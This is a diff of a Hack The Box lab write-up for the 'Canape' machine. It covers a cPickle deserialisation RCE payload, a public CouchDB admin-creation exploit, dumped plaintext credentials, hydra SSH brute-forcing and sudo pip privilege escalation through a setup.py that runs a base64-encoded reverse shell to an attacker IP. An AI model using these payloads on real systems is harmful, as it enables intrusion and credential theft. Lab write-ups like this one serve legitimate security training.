@@ -1,6 +1,6 @@
 ---
 layout: single
-title: Mischief - Hack The Box
+title: Canape - Hack The Box
 date: 2023-07-28
 classes: wide
 header:
@@ -18,17 +18,18 @@ tags:
 
 ### Summary
 ------------------
-- There is a .git/ directory exposed in the main webpage.
-- There is a unserialize RCE vulnerability in /check route.
-- Enumeration of couchdb gives the password for user homer.
-- Bad sudo permissions make possible privilege escalation by using pip.
+- There is a `.git/` directory exposed in the main webpage.
+- There is a unserialize RCE vulnerability in `/check` route.
+- Abusing `couchdb` vulnerability.
+- Enumeration of `couchdb` gives the password for user `homer`.
+- Bad sudo permissions make possible privilege escalation by using `pip`.
 
 ### Detailed steps
 ------------------
 
 ### Nmap
 
-Port 80 exposes a Web service and port 65535 looks like ssh.
+Port 80 exposes a Web service and port 65535 looks like ssh.    
 OpenSSH 7.2p2 is vulnerable to user enumeration.
 
 ```
@@ -43,7 +44,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Fuzzing Web service
 
-Looks like the webpage uses some type of antifuzzing technology and sometimes responds with random lengths so you can't filter responses.
+Looks like the webpage uses some type of antifuzzing technology and sometimes responds with random lengths so you can't filter responses.    
 Even adding super long delay time responds with random lengths.
 
 ```
@@ -114,7 +115,7 @@ for d in dirs:
     prog += 1
 ```
 
-Now we run the script and wait for our results.
+Now we run the script and wait for the results.
 
 ```
 history ~ $ python3 fuzz.py /opt/wordlists/SecLists/Discovery/Web-Content/common.txt
@@ -128,7 +129,7 @@ Discovered: submit
 [4660/4661]
 ```
 
-We can see we discovered `.git/HEAD`
+We can see we discovered `.git/HEAD`    
 I will try to dump the `.git` directory with `git-dumper`.
 
 ```
@@ -299,13 +300,13 @@ loot/templates/index.html
 loot/templates/layout.html
 ```
 
-We see that is a python application.
-Before we continue, we should look at what the website first.
+We see that is a python application.    
+Before we continue, we should look at what the website first.    
 
 ![](/assets/images/htb-writeup-canape/web.png)
 
-It looks like a Simpsons themed webpage were we can submit quotes and view them.
-Lets have a look at the source code of the web page.
+It looks like a Simpsons themed webpage were we can submit quotes and view them.    
+Lets have a look at the source code of the web page.    
 
 ```python
 import couchdb
@@ -393,14 +394,14 @@ if __name__ == "__main__":
     app.run()
 ```
 
-So I can see that when I submit a quote, it is saved in `/tmp/{id}.p`
-Another thing that I see is the `/check` route.
+So I can see that when I submit a quote, it is saved in `/tmp/{id}.p`    
+Another thing that I see is the `/check` route.    
 Apparently it reads the content of the quote file and then it loads it into `cPickle` if it contains the string "p1".
 
 ### RCE Strategy
 
-The strategy I am going to follow here is to try loading a serialized payload into the quote file and the loding it with `/check`.
-One thing to take into account is that the quote isn't saved as I send it, it is saved with the name of the characted appended:
+The strategy I am going to follow here is to try loading a serialized payload into the quote file and the loding it with `/check`.    
+One thing to take into account is that the quote isnt saved as I send it, it is saved with the name of the character appended to it:
 
 ```python
 ...
@@ -414,7 +415,7 @@ One thing to take into account is that the quote isn't saved as I send it, it is
 ...
 ```
 
-Searching a bit about absuing cPickle I found a [post](https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/) where it is using a preserialized payload so I don't have to.
+Searching a bit about absuing cPickle I found a [post](https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/) where it is using a preserialized payload so I don't have to.    
 So a serialized payload would look like this:
 
 ```python
@@ -427,7 +428,7 @@ Now that we have the payload, we need to know the quote id, which is the md5 has
 quote_id = md5(("moe"+quote).encode()).hexdigest()
 ```
 
-Now, the serialize payload wont work because the character is appended to the quote, but if the character is in capital letters, cPickle will ignore it.
+Now, the serialize payload wont work because the character is appended to the quote, but if the character is in capital letters, cPickle will ignore it.    
 Knowing this we will have to send the character with capital letters.
 
 ```python
@@ -436,7 +437,16 @@ response = requests.post("http://10.10.10.70/submit",data={"character":"MOE","qu
 quote_id = md5(("MOE"+quote).encode()).hexdigest()
 ```
 
-Now with all that we just post /check with the id of the quote and we should obtain RCE.
+Finally I will add `# p1` at the end of the command so it loads it into `cPickle`.
+
+```
+...
+cmd = base64.b64encode(cmd.encode()).decode()
+payload = f"cos\nsystem\n(S'echo {cmd} | base64 -d | bash # p1'\ntR.'\ntR."
+...
+```
+
+Now with all that we just post `/check` with the id of the quote and we should obtain RCE.    
 I will leave my custom POC here:
 
 ```python
@@ -487,27 +497,27 @@ We launch our exploit and obtain a reverse shell:
 
 ### www-data to homer
 
-When listing processes I see an interesting process being run by homer:
+When listing processes I see an interesting process being executed by homer:
 
 ```
 homer       602  0.4  3.3 649340 33360 ?        Sl   09:44   0:19 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
 ```
 
-It looks like it is running couchdb, so like any other database server I will enumerate it:
+It looks like it is running `couchdb`, so like any other database server I will enumerate it:
 
 ```
 www-data@canape:/$ curl -X GET http://localhost:5984/_all_dbs
 ["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
 ```
 
-An interesting database named passwords pops up, but trying to enumerate it give access denied:
+An interesting database named `passwords` pops up, but trying to enumerate it give access denied:
 
 ```
 www-data@canape:/$ curl -X GET http://localhost:5984/passwords/_all_docs
 {"error":"unauthorized","reason":"You are not authorized to access this db."}
 ```
 
-Searching further I found that there is an [exploit](https://www.exploit-db.com/exploits/44498) for this couchdb version that lets you create a new admin account.
+Searching further I found that there is an [exploit](https://www.exploit-db.com/exploits/44498) for this `couchdb` version that lets you create a new admin account.    
 I will copy it to the machine and run it.
 
 ```
@@ -518,7 +528,7 @@ www-data@canape:/tmp$ python2 exploit.py 127.0.0.1 -u s0ck37 -P s0ck37
 [+] User s0ck37 with password s0ck37 successfully created.
 ```
 
-Now that we have new credentials we can enumerate the password database:
+Now that we have new credentials we can enumerate the `passwords` database:
 
 ```
 www-data@canape:/tmp$ curl -X GET http://s0ck37:s0ck37@localhost:5984/passwords/_all_docs
@@ -537,7 +547,7 @@ www-data@canape:/tmp$ curl -X GET http://s0ck37:s0ck37@localhost:5984/passwords/
 {"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
 ```
 
-So it looks like each id contains some credentials, I will copy all of them to a txt file and bruteforce the ssh with hydra.
+So it looks like each id contains some credentials, I will copy all of them to a txt file and bruteforce the ssh with `hydra`.
 
 ```
 history ~ $ cat passwords.txt
@@ -582,9 +592,8 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQzNDMgMD4mMQ==
 homer@canape:/tmp/exploit$ echo 'import os;os.system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQzNDMgMD4mMQ== | base64 -d | bash")' > setup.py
 ```
 
-And now we run sudo pip install . and we obtain a reverse shell as root:
+And now we run `sudo pip install .` and we obtain a reverse shell as root:
 
 ![](/assets/images/htb-writeup-canape/root.png)
-
-Now we read the root.txt and we finished.
+    
 Cheers!
